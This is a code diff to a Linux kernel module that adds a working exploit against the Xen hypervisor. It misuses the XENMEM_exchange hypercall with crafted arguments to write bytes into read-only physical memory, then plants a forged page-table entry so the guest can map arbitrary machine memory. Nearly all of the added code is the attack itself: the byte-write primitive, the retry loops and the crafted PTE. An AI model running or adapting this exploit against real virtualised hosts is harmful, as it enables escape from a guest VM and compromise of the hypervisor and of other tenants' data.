@@ -107,26 +107,222 @@ int mmu_update(unsigned long ptr, unsigned long val)
 
 	return rc;
 }
+#define slow_print(...) ({pr_emerg(__VA_ARGS__); schedule_timeout_uninterruptible(2);})
+
+unsigned long call_int_85(void);
+void backstop_85_handler(void);
+
+#define XENMEM_exchange 11UL
+#define DOMID_SELF (0x7FF0U)
+#define INTERRUPT_PAGEFAULT 14
+#define VOID_PTE (mfn_pte(0, __pgprot(0)))
+#define PHYSICAL_PMD_PAGE_MASK_  (((signed long)PMD_PAGE_MASK) & __PHYSICAL_MASK)
+#define PHYSICAL_PUD_PAGE_MASK_  (((signed long)PUD_PAGE_MASK) & __PHYSICAL_MASK)
+
+struct xen_memory_reservation {
+    u64 extent_start;
+    u64 nr_extents;
+    u32 extent_order;
+    u32 address_bits;
+    u16 domid;
+};
+
+struct xen_memory_exchange {
+    struct xen_memory_reservation in;
+    struct xen_memory_reservation out;
+    u64 nr_exchanged;
+};
+
+
+static int dealloc_with_last_byte(u8 val) {
+  void *victim_page_virt;
+  u64 in_extent;
+  u64 out_extent;
+  int ret;
+  struct xen_memory_exchange args;
+  while (1) {
+    // Find a physical page whose MFN ends with the value we want.
+    // Leak everything else.
+    victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
+    if (!victim_page_virt) return 1;
+    in_extent = virt_to_mfn(victim_page_virt);
+    if ((in_extent & 0xff) != val) {
+      //slow_print("got 0x%hhx, wanted 0x%hhx  (in_extent=0x%llx)\n", (u8)(in_extent & 0xff), val, in_extent);
+      continue;
+    }
+
+    // Remove reference to the page.
+    HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
+
+    // Push the page on the domheap by exchanging it for a different one.
+    // This calls XENMEM_exchange with legitimate arguments; the bug is triggered
+    // in try_write_byte_hyper().
+    out_extent = 0; /* this is probably not exactly right */
+    args = (struct xen_memory_exchange){
+      .in = {
+        .extent_start = (u64)&in_extent,
+        .nr_extents = 1,
+        .domid = DOMID_SELF
+      },
+      .out = {
+        .extent_start = (u64)&out_extent,
+        .nr_extents = 1,
+        .domid = DOMID_SELF
+      }
+    };
+    ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
+    if (ret != 0) {
+      slow_print("exchange in dealloc_with_last_byte() failed with %d\n", ret);
+      return ret;
+    }
+    return 0;
+  }
+}
+
+/* writes a byte to Xen-enforced readonly physical memory, clobbering the next 7 bytes.
+ * may fail silently because of raciness, caller should verify.
+ * rval!=0 means stuff went wrong, memory allocation failure or so.
+ */
+static int try_write_byte_hyper(u8 *dst, u8 val) {
+  u64 target_addr = arbitrary_virt_to_machine(dst).maddr + 0xffff830000000000;
+  u64 out_extent_base_addr, in_extent, nr_exchanged,
+      nr_extents, in_extent_addr, in_extent_base;
+  void *victim_page_virt;
+  struct xen_memory_exchange args;
+  unsigned long ret;
+
+  // hypervisor is lower than kernel, so hypervisor reference has to come first
+  out_extent_base_addr = (target_addr & 0x7);
+
+  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
+  if (!victim_page_virt) return 1;
+  in_extent = virt_to_mfn(victim_page_virt);
+
+  // We need to do this to make steal_page() in memory_exchange() work.
+  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
+  HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);
+
+  nr_exchanged = (target_addr - out_extent_base_addr) / 8;
+  nr_extents = nr_exchanged + 1;
+  in_extent_addr = (u64)&in_extent;
+  in_extent_base = in_extent_addr - (nr_exchanged * 8);
+
+  if (dealloc_with_last_byte(val))
+    return 1;
+
+  args = (struct xen_memory_exchange){
+    .in = {
+      .extent_start = in_extent_base,
+      .nr_extents = nr_extents,
+      .domid = DOMID_SELF
+    },
+    .out = {
+      .extent_start = out_extent_base_addr,
+      .nr_extents = nr_extents,
+      .domid = DOMID_SELF
+    },
+    .nr_exchanged = nr_exchanged
+  };
+  ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
+  if (ret) {
+    slow_print("try_write_byte_hyper: hypercall returns 0x%lx\n", ret);
+    return ret;
+  }
+  return 0;
+}
+
+static int write_byte_hyper(u8 *dst, u8 val) {
+  slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
+  while (READ_ONCE(*dst) != val) {
+    if (try_write_byte_hyper(dst, val))
+      return 1;
+  }
+  slow_print("write_byte_hyper successful\n");
+  return 0;
+}
+
+/*
+ * Writes a Page-Directory-Pointer-Table Entry (PDPTE) that references a Page Directory.
+ * Exploits the bug to create a reference to a Page Directory we fully control.
+ * 1GB of memory is mapped through the Page Directory.
+ */
+static int set_pte_entry(pte_t *pte, u64 pg_phys_addr) {
+  int i;
+
+  /* data we want to write */
+  u8 crafted_pte_entry[] = {
+    /* flags of phys mapping:
+     * present=1, write=1, user=1, pwt=0, pcd=0, a=0, d=0, ps=0
+     * (including phys address zero)
+     */
+    0x07, 0, 0, 0, 0, 0, 0, 0,
+    /* flags of adjacent mapping: present=0 (plus trailing garbage that's invisible here).
+     * This is necessary because otherwise, trailing garbage from the first entry might
+     * set the present bit for this entry. */
+    0
+  };
+  *(uint64_t*)crafted_pte_entry |= pg_phys_addr;
+
+  slow_print("### trying to write crafted PTE entry...\n");
+  for (i = 0; i < sizeof(crafted_pte_entry); i++) {
+    slow_print("### writing byte %d\n", i);
+    if (write_byte_hyper(((u8*)pte) + i, crafted_pte_entry[i])) {
+      slow_print("### write_byte_hyper failed!\n");
+      return 1;
+    }
+  }
+  slow_print("### crafted PTE entry written\n");
+  return 0;
+}
+
+
 
 static int __init arbitrary_access_init(void) {
 
-    int rc = 0;
+    //int rc = 0;
+    unsigned long my_pt = __get_free_pages(GFP_KERNEL, 0);
+    /*logvar(my_pt,"%p");
+    logvar(*my_pt,"%lx");
+    page_walk((unsigned long) my_pt);
+    
+    */
+    pte_t *my_pte = get_pte((unsigned long)my_pt);
+
     printk("Entering: %s\n",__FUNCTION__);
+
 
     if ( !addr ){
         printk("Address parameter is mandatory!\n");
         return -1;
     }
 
-    uint64_t gpfn = addr >> PAGE_SHIFT;
+    uint64_t mfn = addr >> PAGE_SHIFT;
     int offset = addr & ~PAGE_MASK;
+    LOG("Address of my_pt");
+    logvar((void *)my_pt,"%p");
+    page_walk(my_pt);
     printk("The INPUT address info:\n");
     logvar(addr,"%lx");
     printk("\taddres:\t%lx\n",addr);
-    printk("\tGuest Page address (with flags):\t%llx\n", (gpfn << PAGE_SHIFT) | PTE_FLAG );
-    printk("\tgpfn:\t%llx\n",gpfn);
+    printk("\tmfn:\t%llx\n",mfn);
     printk("\toffset:\t%x\n",offset);
 
+    set_pte_entry(my_pte, mfn);
+    barrier();
+    LOG("Linking done!");
+    page_walk(my_pt);
+
+    // Update the va to match the content 
+    logvar((void *)my_pt,"%p");
+    my_pt = my_pt >> PAGE_SHIFT << PAGE_SHIFT;  // reset the offset byte
+    logvar((void *)my_pt,"%p");
+    my_pt = my_pt | offset;
+    logvar((void *)my_pt,"%p");
+
+    LOG("Print content in memory");
+    logvar(*((unsigned long *)my_pt),"%lu");
+
+/*
     if ( value ){
         printk("Will write the %lx values into 0x%lu\n",value, addr);
         rc = HYPERVISOR_arbitrary_access(addr, &value, sizeof(value), ARBITRARY_WRITE);
@@ -148,7 +344,7 @@ static int __init arbitrary_access_init(void) {
     else 
         printk("Value stored on 0x%lx is 0x%lx\n", addr, value);
 
-
+*/
     LOG("Done!");
 
     return 0;
